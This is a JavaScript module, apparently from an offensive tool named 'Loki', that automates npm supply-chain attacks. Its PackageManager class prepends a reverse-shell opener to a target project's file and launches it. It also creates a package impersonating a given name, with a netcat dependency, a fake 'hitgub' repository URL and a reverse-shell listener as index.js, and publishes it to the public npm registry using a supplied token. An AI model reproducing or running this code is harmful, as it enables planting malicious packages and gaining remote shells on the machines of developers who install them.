'use strict'

import fs from 'fs'
import pack from 'libnpmpack'
import { execSync, fork } from 'child_process'
import { publish } from 'libnpmpublish'
import ReverseShellGenerator from './ReverseShellGenerator.js'

// npmjs default registry
const OPTS = {
    registry: 'https://registry.npmjs.org/'
}

class PackageManager {
    constructor({ pkg, version, directory, token, shell_data }) {
        this.pkg = pkg
        this.version = version
        this.base_directory = directory
        this.loki_directory = `${this.base_directory}/_loki_packages`
        this.directory = `${this.loki_directory}/${this.pkg}`
        this.token = token
        this.shell_data = shell_data
        this.reverse_shell_generator = new ReverseShellGenerator(this.shell_data)
    }

    installDependencies() {
        return execSync(`$(which npm) install`, {
            cwd: this.base_directory
        })
    }

    testInjection(file, success) {
        fork(file, {
            cwd: this.base_directory
        })
        process.on('error', function (err) {
            console.log(err);
        });
        process.on('exit', function (code) {
            const err = code === 0 ? null : new Error('exit code ' + code);
            console.log(err);
        });

        success('Reverse shell ready:')
        this.reverse_shell_generator.runLocalClient()
    }

    insertPayload(file) {
        const contents = fs.readFileSync(`${this.base_directory}/${file}`, 'utf8')
        fs.writeFileSync(`${this.base_directory}/${file}`, this.reverse_shell_generator.opener(this.pkg) + contents)
        return true
    }

    async impersonatePackage() {
        fs.mkdirSync(this.directory, { recursive: true })

        const package_json = JSON.stringify({
            name: this.pkg,
            version: this.version,
            private: false,
            dependencies: {
                'netcat': '^1.5.0',
            },
            type: 'module',
            description: 'Loki automation package',
            repository: {
                "type": "git",
                "url":  `git://github.com/hitgub/${this.pkg}.git`
            }
        })
        fs.writeFileSync(`${this.directory}/package.json`, package_json)

        const index_js = this.reverse_shell_generator.listener()
        fs.writeFileSync(`${this.directory}/index.js`, index_js)

        const manifest = {
            name: this.pkg,
            version: this.version,
            description: 'Loki automation package'
        }
        const tarData = await pack(`file:${this.directory}`, { ...OPTS})

        return {
            manifest,
            job: publish(manifest, tarData, {
                ...OPTS,
                npmVersion: this.version,
                forceAuth: {
                    token: this.token
                }
            })
        }
    }
}

export default PackageManager
